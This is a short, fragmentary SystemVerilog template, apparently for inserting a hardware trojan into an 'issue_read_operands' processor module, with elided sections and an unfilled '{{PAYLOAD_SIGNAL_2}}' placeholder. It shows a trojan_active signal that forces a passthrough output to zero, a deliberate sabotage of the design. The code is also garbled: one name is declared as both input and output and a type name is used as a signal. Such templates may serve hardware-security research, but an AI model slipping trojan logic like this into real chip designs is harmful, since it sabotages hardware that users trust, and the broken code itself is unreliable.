...
module issue_read_operands_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic scoreboard_entry_t,
    output logic scoreboard_entry_t,
    ...
    assign scoreboard_entry_t = trojan_active ? 1'b0 : scoreboard_entry_t_normal;
    ...
    logic scoreboard_entry_t_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign scoreboard_entry_t_normal = scoreboard_entry_t;
 ...
 *     input  logic instr_valid_i,   // scoreboard_entry_t
 *     output logic instr_valid_o    // scoreboard_entry_t
 * );
